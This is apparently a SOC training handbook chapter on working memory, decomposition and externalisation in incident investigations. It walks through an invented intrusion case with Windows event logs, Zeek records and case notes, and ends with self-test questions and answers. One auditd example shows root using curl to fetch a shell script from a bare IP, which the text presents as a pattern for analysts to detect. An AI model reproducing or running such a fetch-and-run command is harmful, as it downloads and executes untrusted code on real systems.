[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs and log lines are invented for illustration (.example, documentation and private IPs). Psychology findings are described in my own words.

docs.title: The 8 key points
docs.text:
1. Memory is the raw material of perception. Your mental models come from experience stored in long-term memory, so whatever affects memory affects the result of your analysis.
  2. Three stages: a sensory store that holds raw input for a fraction of a second, short-term (working) memory that interprets it and holds only a handful of items, and long-term memory with practically no storage limit — where storing well and finding again are the hard parts.
  3. Working memory is tiny. The classic figure is about 7 ± 2 items; newer research puts the true limit closer to about 4 chunks. Either way, information only stays there while you keep rehearsing it.
  4. Investigations are far bigger than that. Ten entities already have 45 possible pairwise relationships; twenty have 190. Trying to hold an investigation "in your head" is guaranteed to fail.
  5. Decomposition breaks the problem into parts you can understand separately (inputs, outputs, what happens inside), then reassembles them. Externalisation writes entities, events and relationships down so you can see them all at once without using working memory.
  6. Modelling the problem helps you learn it. A structure (table, timeline, tree, mind map, matrix) gives new information categories and connections, which makes recall easier and, with repeated use, moves the model into long-term memory.
  7. Assimilation is the shortcut into long-term memory: connect new information to a concept you already understand. Analogies and models work because of this; mnemonics are a weaker, artificial version.
  8. Experience cuts both ways. Strengthened pathways make experts fast and accurate on familiar problems — and form mental ruts that make it hard to see alternatives, harder to be creative and expensive to unlearn. In security the rules change constantly, so the experienced have the most to unlearn. The defence is many accurate mental models plus awareness of these failure modes.

docs.title: Why this matters in a SOC
docs.text:
Picture a desk that can hold only four sheets of paper. Every time you put a fifth on it, one falls off the edge — and you don't always notice which. That's working memory. An analyst who works a case with no notes is shuffling sheets on that desk: the IP from twenty minutes ago, the second username, the odd DNS query they decided didn't matter. Something falls off, and it's usually the thing that would have connected everything.

The technical reality behind the analogy: an intrusion of any size involves dozens of hosts, accounts, addresses, processes and files, and what matters is the relationships between them (this account logged on to that host from that address, which then started this process). Missing a relationship isn't a small error — it's how lateral movement goes unseen and how containment leaves one compromised machine behind. The two habits on this page, decomposition and externalisation, are the cheapest quality control a SOC has. They also make hand-overs possible: case 1 on the previous page was saved because a colleague could read the whole case at once.

There's a second reason. Long-term memory is where your mental models live, and what is stored there — and how — decides how fast and how accurately you recognise the next attack. Knowing how memory gets built tells you how to learn this field quickly, and knowing how it fails tells you when your experience is most likely to mislead you.

docs.title: Types of memory
docs.text:
Heuer describes memory as a sequence of stages (based on the cognitive psychology of his time, which is still a useful model):

Stage What it does Capacity How long it lasts Sensory information store Holds a raw "image" of what your senses just picked up Large, but unprocessed A fraction of a second to a few seconds, then gone Short-term memory (working memory) Interprets what came in, picks out what matters, and is where you actually think Very small — a handful of items Seconds, unless you keep repeating it Long-term memory Stores what has been encoded for later use: facts, experiences, schemas, mental models No practical limit Potentially a lifetime

A few points that matter for analysts:

  • Short-term memory has to be refreshed. The only way to keep something there is to keep rehearsing it ("10.20.4.12, 10.20.4.12…"). The moment your attention goes to a new query result, the old item starts to fade. Some of what you rehearse gets passed on to long-term memory; most doesn't.
  • Long-term memory isn't a filing cabinet that's running out of space. Its capacity isn't the problem. The problems are encoding (did the information get stored, and connected to anything?) and retrieval (can you find it when you need it, using the cue you happen to have?). You've had the experience of knowing you've seen an indicator before but not being able to recall where — that's a retrieval failure, not a storage one.
  • Long-term memory is organised as a network of connected ideas — schemas. A memory you can reach from many different cues (a port number, a tool name, a process tree shape, a past incident) is easy to retrieve. A memory with one weak connection is effectively lost.

For our purposes the two things to remember are the limits of short-term memory and the organisation of long-term memory. The rest of this page is about working with the first and exploiting the second.

docs.title: The 7 ± 2 limit — and the newer estimate
docs.text:
The figure everyone quotes comes from a 1956 paper by the psychologist George Miller: people can hold roughly seven items, plus or minus two, in short-term memory. Heuer uses this figure, and it's good enough to make the point.

[Correction] Later research (notably Nelson Cowan's 2001 review) argues that once you stop people from rehearsing and grouping, the real capacity is closer to about four "chunks". Miller's seven was partly inflated by chunking. The direction of the lesson doesn't change — it gets stronger: working memory is even smaller than the classic figure suggests.

Chunking is the important idea hidden inside that correction. A chunk is a group of items that your long-term memory already knows as one unit. To a beginner, these are five separate things to hold:

4624   Logon Type 3   4672   adm_j.marsh   KL-APP03

To an experienced analyst they are one chunk: "an admin account made a privileged network logon to the app server". That's why experts seem to hold much more in their heads — not because their working memory is bigger, but because their long-term memory packages information into bigger chunks. It's also a hint about how to learn: the more patterns you know well, the more each slot in working memory can carry.

docs.title: Why investigations overflow working memory
docs.text:
Even a small case contains more than seven things. But the bigger problem is that analysis is about relationships, and relationships grow much faster than items. If you have n entities, the number of possible pairs between them is n × (n − 1) ÷ 2:

Entities in the case Possible pairwise relationships 5 10 7 21 10 45 15 105 20 190

And that's only pairs — "this user, on this host, at this time, from this address" is a relationship between four things at once. By the time you've run three or four queries, you're past what any human can keep straight mentally. The answer isn't to try harder. It's to stop using working memory as storage at all.

docs.title: The solution: decomposition and externalisation
docs.text:
Heuer's answer has two parts that work together.

Decomposition means breaking the problem into smaller parts that you can understand one at a time, then putting them back together to see the whole. It's similar to systems thinking: you take one piece, treat it as a box with inputs, outputs and something happening inside, understand it on its own, and then reconnect it to the larger system. "Is this host compromised?" is too big to think about directly. "How did this file get here?", "What did it do once it ran?", "Which account was used, and from where?" and "Did anything leave the network?" are each small enough to answer.

Externalisation means getting the problem out of your head and onto paper, a screen, a whiteboard — anything that lets you see all the pieces at once and draw the relationships between them. Decomposition alone still leaves you with more pieces than you can hold; externalisation is what lets you keep them all in view.

An analogy: a jigsaw puzzle. Decomposition is sorting the pieces — edges here, sky there, the red barn in a third pile — and finishing each area separately. Externalisation is spreading the pieces face up on the table instead of keeping them in the box and pulling them out one at a time. Nobody would try to do a thousand-piece puzzle from inside the box. Yet that's what an unwritten investigation is.

docs.title: What externalising looks like in practice
docs.text:
There is no single correct format. Use the one that fits the question you're answering:

Format Good for SOC example Entity list / table Keeping every host, account, IP, domain, file and hash in one place with a short note "203.0.113.77 — external, resolved from update-cdn.example, seen from KL-APP03 and KL-WS-0412" Timeline Order of events, gaps, cause and effect One row per event, in UTC, with source and host Relationship list / graph Who connected to what, which account was used where adm_j.marsh → logon type 3 → KL-APP03 Tree / mind map Decomposing a big question into sub-questions "Compromised?" → delivery / execution / persistence / spread / exfiltration Matrix Comparing hypotheses against evidence, or hosts against indicators Later sections use matrices for structured analysis Hypothesis log Writing theories down with time and confidence, plus alternatives "14:20 — working theory: admin installed tool; alternative: attacker with stolen admin creds"

[Supplement] The best place for these is your case management system or ticket, not a private notebook: it keeps the record with the case, lets a colleague take over at any point, and becomes the evidence trail for later review. Use a scratch file or whiteboard for thinking, then move the result into the case.

docs.title: Worked case: one alert, twenty entities
docs.text:
Here's a realistic case worked twice — once in the head, once on paper.

14:02 — the alert.

[EDR] New service installed with binary in temp directory   severity: high
  host=KL-APP03   service=SvcHelper   path=C:\Windows\Temp\svchelper.exe   user=SYSTEM

The analyst, Priya, pulls the System log entry behind it:

Event ID 7045  Log: System  Computer: KL-APP03  2026-11-24T13:58:12Z
  A service was installed in the system.
  Service Name:      SvcHelper
  Service File Name: C:\Windows\Temp\svchelper.exe
  Service Type:      user mode service
  Service Start Type: auto start
  Service Account:   LocalSystem
  • 7045 ("A service was installed in the system") is written to the System log by the Service Control Manager whenever a new service is registered. It fires on the host where the service was created. Attackers care because a service is an easy way to run code as SYSTEM and to make it start again after reboot — both execution (T1569.002 System Services: Service Execution) and persistence (T1543.003 Create or Modify System Process: Windows Service). Remote execution tools like PsExec create a service on the target too (services and tasks).
  • Service File Name — a binary in C:\Windows\Temp is a red flag: legitimate services live in Program Files or System32, not in a temp folder anyone can write to.
  • Service Start Type: auto start — it will run at every boot: persistence.
  • Service Account: LocalSystem — the highest privilege on the machine.

14:09 — who did it? Security log on KL-APP03, a few seconds before the 7045:

Event ID 4624  Computer: KL-APP03  2026-11-24T13:57:58Z
  Account Name: adm_j.marsh   Logon Type: 3   Logon ID: 0x3E7A21
  Source Network Address: 10.20.4.12   Authentication Package: Kerberos
Event ID 4672  Computer: KL-APP03  2026-11-24T13:57:58Z
  Account Name: adm_j.marsh   Logon ID: 0x3E7A21
  Privileges: SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege, ...
  • 4624 (successful logon) with Logon Type 3 — a network logon (for example, connecting to the service manager or an admin share remotely). It fires on the target. Attackers produce it every time they use stolen credentials against another machine (logins).
  • 4672 ("Special privileges assigned to new logon") fires right after 4624 when the account has admin-level privileges. The matching Logon ID (0x3E7A21) ties the two events into one session. Attackers care because it means the session can do anything — install services, dump memory (SeDebugPrivilege).
  • Source Network Address: 10.20.4.12 — the logon came from another internal machine. Asset inventory says that's KL-WS-0412, a workstation belonging to j.marsh.

So adm_j.marsh — the admin account of a real IT admin — logged on from his own workstation and installed a service. Working theory: Jordan Marsh deploying a tool. Plausible; admins do this.

14:18 — what did the service do?

Event ID 4688  Computer: KL-APP03  2026-11-24T13:58:13Z
  Creator Process Name: C:\Windows\System32\services.exe
  New Process Name:     C:\Windows\Temp\svchelper.exe
  Process Command Line: C:\Windows\Temp\svchelper.exe -k netsvcs
  • 4688 ("A new process has been created") — the service's binary started as a child of services.exe, exactly as a service should. The -k netsvcs argument imitates the way real Windows services are started by svchost.exe, but this isn't svchost.exe — a small piece of masquerading (T1036.004 Masquerading: Masquerade Task or Service) (process creation).

14:25 — network. Zeek logs from the server segment:

#fields ts  uid  id.orig_h  id.orig_p  id.resp_h  id.resp_p  proto  service  duration  orig_bytes  resp_bytes  conn_state
1795528692.4  CaX1  10.20.6.33  50122  203.0.113.77  443  tcp  ssl  1598.2  1830442  95120  SF
  • id.orig_h=10.20.6.33 — KL-APP03; id.resp_h=203.0.113.77, port 443 — an external address over TLS.
  • duration=1598.2 — about 27 minutes in one connection (Zeek writes the line when the connection ends — this one closed at 14:24). Web browsing rarely holds one TLS session that long; a beacon or interactive channel does.
  • orig_bytes=1830442 vs resp_bytes=95120 — the server sent about 1.8 MB and received about 95 KB. For a "client" that's backwards — more out than in — which hints at data leaving or interactive control.
#fields ts  uid  id.orig_h  query  qtype_name  answers
1795528691.9  Dn7Q  10.20.6.33  update-cdn.example  A  203.0.113.77
  • The DNS lookup just before: KL-APP03 resolved update-cdn.example to 203.0.113.77. A generic "update/CDN" name is a common disguise for command and control (T1071.001 Application Layer Protocol: Web Protocols).

14:31 — more. Priya checks KL-WS-0412 and finds that j.marsh connected over the VPN at 03:12 UTC from an address that isn't his usual home IP, and that his session on KL-WS-0412 has been active since. She vaguely recalls that someone said Jordan was on leave this week. And she remembers that at 14:05, while scrolling KL-WS-0412's DNS, she saw a TXT lookup to cfg.update-cdn.example and dismissed it as antivirus telemetry.

By now there are around twenty entities in play. Count them: four hosts (KL-APP03, KL-WS-0412, KL-DC01 which issued the Kerberos tickets, the VPN gateway), three accounts (j.marsh, adm_j.marsh, the VPN identity), five addresses (10.20.6.33, 10.20.4.12, 203.0.113.77, a VPN pool address, the user's home IP), two domains, two processes, a file and its hash, a service name, and half a dozen timestamps. That's 190 possible pairs. Held in the head, the case goes like this: Priya is still anchored on "admin deploying a tool"; the TXT lookup she dismissed at 14:05 is gone from working memory; she doesn't notice that it went to the same parent domain as the C2 connection; and the 03:12 VPN login is a fact she half-remembers but never compares with the leave calendar.

docs.title: The same case, externalised
docs.text:
Now the version on paper. Priya opens the case notes and writes as she goes:

CASE KL-2026-1124-07   Owner: Priya   Opened 14:02Z

QUESTION
  Is KL-APP03 compromised? If yes: how, by whom, what else, is data leaving?

SUB-QUESTIONS (decomposition)
  Q1 Delivery:      how did svchelper.exe get onto KL-APP03?
  Q2 Execution:     what started it, under which account?            -> 7045, 4688
  Q3 Access:        where did that account come from?                -> 4624/4672 from 10.20.4.12
  Q4 Origin:        is KL-WS-0412 / j.marsh itself compromised?
  Q5 C2/exfil:      what is KL-APP03 talking to outside?             -> 203.0.113.77:443, 27 min, 1.8 MB out
  Q6 Scope:         who else talks to update-cdn.example / 203.0.113.77?

ENTITIES
  host    KL-APP03     10.20.6.33   app server; service SvcHelper installed 13:58Z
  host    KL-WS-0412   10.20.4.12   workstation of j.marsh; source of admin logon
  host    KL-DC01      10.20.1.5    issued Kerberos tickets for adm_j.marsh
  acct    adm_j.marsh               privileged; 4624 type 3 + 4672 on KL-APP03
  acct    j.marsh                   VPN login 03:12Z — user on leave (HR calendar)
  ip      203.0.113.77              external; C2 candidate
  domain  update-cdn.example        A -> 203.0.113.77
  domain  cfg.update-cdn.example    TXT lookup from KL-WS-0412 at 13:41Z  (first dismissed — REOPENED)
  file    C:\Windows\Temp\svchelper.exe   sha256: <pending>

TIMELINE (UTC)
  03:12  VPN login j.marsh from 192.0.2.88 (not his usual home IP)
  13:41  KL-WS-0412  DNS TXT cfg.update-cdn.example
  13:57  KL-APP03    4624 type 3 + 4672  adm_j.marsh from 10.20.4.12
  13:58  KL-APP03    7045 SvcHelper (C:\Windows\Temp\svchelper.exe, auto, LocalSystem)
  13:58  KL-APP03    4688 services.exe -> svchelper.exe -k netsvcs
  13:58  KL-APP03    DNS A update-cdn.example -> 203.0.113.77
  13:58  KL-APP03    TLS to 203.0.113.77:443, 27 min, 1.8 MB out

HYPOTHESES
  H1 14:09  Admin Jordan installed a legitimate tool             (weakening)
  H2 14:09  Attacker using j.marsh's session/creds from KL-WS-0412 (strengthening)
     Would distinguish: change ticket? Jordan on leave? tool known? TXT domain related?

PARKED / DISMISSED (re-check when new facts arrive)
  13:41 TXT lookup from KL-WS-0412 — dismissed 14:05 as AV telemetry; same parent domain as C2 -> RELEVANT

OPEN ACTIONS
  - Ask Jordan / change calendar (14:33)
  - Hash svchelper.exe, check EDR prevalence
  - Search proxy/DNS for update-cdn.example across all hosts (Q6)

Look at what writing it down did:

  • The parked list made the dismissed TXT lookup visible again. When update-cdn.example turned up on the server, the match with cfg.update-cdn.example was on the same screen. Without it, that connection lives only in working memory, which had already dropped it.
  • The timeline put the 03:12 VPN login, the 13:41 TXT lookup and the 13:57 admin logon in one column. The story — attacker logs in via VPN overnight, hands-on-keyboard on Jordan's workstation in the afternoon, beacons out, then uses the admin account to move to the server — is visible as a sequence rather than something you have to reconstruct.
  • The hypothesis log with "would distinguish" turned a feeling into a checklist. One phone call settles it: Jordan is on leave and made no change. H1 drops, H2 becomes the working conclusion, and the case is escalated as a likely compromise of j.marsh (T1133 External Remote Services, T1078 Valid Accounts, T1021.002 Remote Services: SMB/Windows Admin Shares, T1543.003, T1071.001).
  • The sub-questions told her what was still unanswered (Q1 delivery, Q6 scope) when the pressure was to close as soon as the main question felt answered.

This is also why externalising helps you learn. After a few cases written in this shape, the shape itself — delivery, execution, access, origin, C2, scope — becomes a schema in long-term memory, and the next case starts already decomposed.

docs.title: The benefits: structure makes recall easier
docs.text:
Decomposition and externalisation do more than stop you dropping facts. They sort the problem and the actors into categories and simple structures, and structured information is much easier to recall. The model you've built acts as an artificial frame for the problem — something new information can attach to.

It takes time, but with repeated use the model itself moves into long-term memory and links up with what you already know. At that point you truly understand the problem, and you work on it much faster. That's why so many people reach for mind maps, relationship diagrams, trees, lists, tables and matrices when solving problems: they give the brain a structure it can connect to existing concepts.

A simple text mind map for the same case, the kind you might sketch on a whiteboard:

KL-APP03 compromised?
├── Delivery ........ svchelper.exe in C:\Windows\Temp  (how? SMB copy from KL-WS-0412?)
├── Execution ....... 7045 SvcHelper -> 4688 services.exe -> svchelper.exe
├── Access .......... adm_j.marsh, 4624 type 3 + 4672, from 10.20.4.12
│   └── Origin ...... KL-WS-0412 / j.marsh — VPN 03:12 while on leave
├── C2 / exfil ...... update-cdn.example -> 203.0.113.77:443, 27 min, 1.8 MB out
│   └── related ..... cfg.update-cdn.example TXT from KL-WS-0412
└── Scope ........... other hosts resolving update-cdn.example?  (open)

docs.title: The shortcut into long-term memory: assimilation
docs.text:
The most efficient way to move something from short-term to long-term memory is assimilation: take the new information, relate it to a concept you already know well, and store it alongside that concept. The new item doesn't need its own new set of connections — it borrows the existing ones.

Try it. Remember these eight items for a minute:

List A:  stapler, onion, tennis ball, tofu, umbrella, chilli paste, battery, pork belly
List B:  kimchi, pork belly, tofu, onion, spring onion, chilli paste, garlic, anchovy stock

List B is almost effortless if you know Korean cooking: it's kimchi stew (김치찌개). You don't store eight items — you store "kimchi stew ingredients" and the items hang off a schema you already have. List A has no shared category, so every item needs its own artificial link. (A mnemonic — say, a silly sentence using the first letters — is that artificial link. It works, but it's slower to build and more fragile than real assimilation.)

This is why analogies and models speed up learning so much, and why this handbook uses them constantly: each one gives the new idea an existing place to live.

docs.title: Assimilation applied: learning a new log source
docs.text:
[Supplement] The same trick is the fastest way to get productive with an unfamiliar tool or log type. Don't learn it from scratch — map it to what you know. Suppose you know Windows 4688 well and are given Linux auditd process logs for the first time:

type=SYSCALL msg=audit(1795531120.551:8812): arch=c000003e syscall=59 success=yes exit=0 ppid=2210 pid=2245 auid=1001 uid=0 euid=0 comm="curl" exe="/usr/bin/curl" key="exec"
type=EXECVE msg=audit(1795531120.551:8812): argc=3 a0="curl" a1="-s" a2="http://198.51.100.9/x.sh"
What you already know (4688) auditd equivalent Note "A new process has been created" syscall=59 (execve on x86-64) The system call that starts a program New Process Name exe="/usr/bin/curl" Full path of the binary Process Command Line EXECVE record: a0, a1, a2… Each argument is a separate field Creator Process ID ppid=2210 Parent process Subject Account / Logon ID auid=1001 (the original login user), uid/euid auid survives sudo, so it tells you who really ran it Token elevation euid=0 Effective user is root

Read through that lens, the two lines say: the user who originally logged in as UID 1001 is running curl as root and fetching a shell script from a bare IP — a download-and-run pattern (T1105 Ingress Tool Transfer, likely followed by T1059.004 Command and Scripting Interpreter: Unix Shell). You understood a new log format in a minute because every field attached to something you already knew. The same approach works for Zeek against firewall logs, Sysmon against Security events, or a cloud audit log against Windows logon events (Linux logging).

docs.title: The pros and cons of experience
docs.text:
Why spend a page on memory in a field this technical? Because your memories and the mental models built from them are part of the filter through which every piece of incident data is perceived. Even how familiar you are with a concept changes which hypotheses you come up with.

Every time you see and analyse a similar problem, the mental pathways for it get stronger. That's the good part:

  • Speed — accurate, intuitive judgements become faster and easier. The experienced analyst glances at a process tree and knows.
  • Pattern recognition — strong pathways make it easier to spot the malicious shape inside a complex situation. This is, quite literally, the difference between a new analyst and a seasoned one.

But speed and efficiency have a price:

  • Strong pathways become mental ruts. A pathway used often enough becomes the default answer, used even when it's wrong, and it becomes hard to see the situation any other way. The image is a rut in a dirt road: once the groove is deep, the wheels fall into it, and steering out takes real effort.
  • Changing perspective gets harder. You don't just prefer the usual explanation; alternatives stop occurring to you.
  • Creativity gets harder. Novel attack paths need novel hypotheses, and ruts pull you back to familiar ones.
  • Unlearning takes more effort than learning. Replacing a strong, well-connected schema is harder than building a new one from nothing.

docs.title: What mental ruts look like in a SOC
docs.text:
Concrete examples of "knowledge" that was true once and now leads people astray:

The rut Why it was learned Why it misleads now "Malicious Office documents = macros" For years, macro documents were the main phishing payload Since 2022, Office blocks macros in files from the internet by default; attackers moved to ISO/IMG and ZIP containers, LNK shortcuts, HTML smuggling (T1027.006) and links to cloud-hosted files "Port 443 = someone browsing the web" Historically true Most C2 now uses TLS over 443, often to cloud or CDN services (T1071.001, T1102) "MFA succeeded, so it's the real user" MFA stopped password-only attacks Push fatigue (T1621), adversary-in-the-middle phishing that steals session cookies (T1557, T1539) "That alert on that server is always the backup job" It was, 500 times The 501st time is the one that matters (previous page, case 2) "Defense Evasion is one ATT&CK tactic" True from ATT&CK's start until 2026 ATT&CK v19 (April 2026) split it into Stealth and Defense Impairment; your mappings, reports and dashboards need updating

docs.title: Hardened mindsets and the rules that keep changing
docs.text:
With time, experienced analysts' mindsets harden. The reasoning is understandable — "my approach has worked so far, why change?", "I understand how this works" — and in many fields it's even correct: the laws of physics don't change, so an experienced engineer's intuition stays reliable.

Security isn't one of those fields. The "rules" change daily: new techniques, new tools, new infrastructure, new ways of abusing legitimate services. What you learned and the schemas you built may simply not apply to tomorrow's attack. A better hypothesis can require building new schemas, or unlearning old ones — the harder task. And the people with the most to unlearn are exactly the experienced ones.

There's one more trap, and the worked case above shows it. When new information turns up late in an investigation, people tend not to go back and reassess earlier evidence in its light. Once a fact has been judged "doesn't fit" and set aside, it rarely gets picked up again — even when the new information makes it relevant. Priya's dismissed TXT lookup is exactly that. It was only recovered because it was written on a list, not left in her head.

docs.title: The solution
docs.text:
The answer isn't to distrust experience — it's the most valuable thing an analyst has. It's to have many accurate mental models, keep updating them, and stay aware of the typical failures:

  • Build models on purpose and keep more than one for any situation (the next section covers the standard ones: kill chain, OODA, defence in depth, ATT&CK and others).
  • Decompose and externalise every non-trivial case, so working memory is used for thinking, not storage.
  • Keep a parked/dismissed list and re-read it whenever a new fact arrives or before closing.
  • Learn by assimilation — tie every new technique or log type to something you already know — so your models grow quickly and stay connected.
  • Schedule unlearning: when a framework, product or attacker habit changes, deliberately revisit what you "know" about it.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

The memory model, the tiny size of working memory, the value of decomposition and externalisation, assimilation as the fast route into long-term memory, and the double edge of experience are all still accepted and widely taught. Heuer's book remains freely available from the CIA's Center for the Study of Intelligence. Writing a structured case record (entities, timeline, hypotheses, open questions) is standard practice in mature SOCs and DFIR teams, and most case-management platforms are built around exactly these elements.

[Changed] What has changed

  • The working-memory estimate shrank. The classic "7 ± 2" is still quoted, but the more commonly cited modern estimate is about 4 chunks — which only strengthens the case for externalising.
  • AI copilots are becoming external memory. SOC platforms now generate case summaries, timelines and entity lists automatically. That's genuine externalisation, and it helps — but it's someone else's decomposition. Early evidence also suggests heavy reliance can reduce your own engagement: a 2025 MIT Media Lab preprint (Your Brain on ChatGPT, Kosmyna et al., 54 participants, essay writing, not peer-reviewed at release) reported lower brain connectivity and poorer recall of their own work among people who wrote with an LLM. It's a small study in a different task, so treat it as a warning sign, not a settled result.
  • Your models are moving underneath you, fast. ATT&CK split Defense Evasion into Stealth and Defense Impairment in v19 (April 2026) and added AI-related techniques in v20 (October 2026). Attackers' speed raises the cost of a stale model: one 2026 industry report put average eCrime "breakout" (initial access to lateral movement) at 29 minutes, with the fastest at 27 seconds. Unlearning is now part of the job, not an occasional event.

[Caution] Wrong or risky to do the old way

  • Don't work cases "in your head" and write up at the end. Write as you go; the end-of-case write-up is where dismissed evidence disappears for good.
  • Don't let an AI-generated summary replace your own model. Use it as a draft to check against the raw events — and build your own sub-questions and hypothesis list.
  • Don't paste case data into AI tools your organisation hasn't approved. Externalising into an unapproved public service is an OPSEC and data-handling failure (analysis OPSEC is covered in a later section).
  • Don't delete dismissed evidence — park it. Keep it visible in the case with the reason it was dismissed, so new facts can bring it back.
  • Don't treat "I've seen this a hundred times" as evidence. It's a reason to check the fields that distinguish the usual case from a lookalike.

docs.title: Question 1
docs.text:
Explain the difference between short-term and long-term memory, and what the main limitation of each is for an analyst. Why does an expert seem to hold more in their head than a beginner?

Answer and explanation

Short-term (working) memory is where you interpret incoming information and actually think. Its limitation is capacity — classically about 7 ± 2 items, more recently estimated at about 4 chunks — and information fades unless you keep rehearsing it.

Long-term memory stores encoded information, schemas and mental models with no practical capacity limit. Its limitations are encoding (was the information stored and connected to anything?) and retrieval (can you find it again from the cue you have?).

Experts aren't working with a bigger working memory. Their long-term memory lets them chunk: "4624 type 3 + 4672 for adm_j.marsh on KL-APP03" is one chunk ("privileged network logon to the server") for an expert, but five separate items for a beginner. Each working-memory slot carries more.

docs.title: Question 2
docs.text:
A case has grown to 15 entities. How many possible pairwise relationships is that? Name the two techniques that compensate, explain what each does, and give one concrete artefact you'd produce for each.

Answer and explanation

15 × 14 ÷ 2 = 105 possible pairs — and many relationships involve more than two entities at once.

  • Decomposition — break the big question into smaller ones you can answer one at a time, then reassemble. Artefact: a list of sub-questions such as delivery / execution / access / origin / C2 / scope, or a mind-map tree.
  • Externalisation — move the problem out of your head so you can see every piece and relationship at once. Artefacts: an entity table, a UTC timeline, a relationship list or graph, a hypothesis log with "what would distinguish", and a parked/dismissed list.

Both should live in the case record so another analyst can take over.

docs.title: Question 3
docs.text:
In the worked case, what was the "dismissed evidence" trap, why does it happen, and what habit prevented it? Then give one example of a mental rut from your own area of work and how you would deliberately unlearn it.

Answer and explanation

Priya dismissed a TXT lookup to cfg.update-cdn.example as antivirus telemetry. When update-cdn.example later appeared as the C2 domain, the earlier lookup became highly relevant — but people rarely go back and re-evaluate evidence they've already judged "doesn't fit". It happens because the dismissed item drops out of working memory and the existing hypothesis gives no reason to look for it. The parked/dismissed list in the externalised case notes kept it visible, so the connection was obvious.

Example of a rut (any well-argued one is fine): "malicious Office files are macro documents." Since 2022 macros from the internet are blocked by default and attackers use ISO/ZIP containers, LNK files, HTML smuggling (T1027.006) and cloud-hosted links. To unlearn it: review recent phishing cases and threat reports for current delivery methods, update the triage checklist and detection coverage to match, and look at a few real samples of the new formats so the new schema has concrete examples attached.
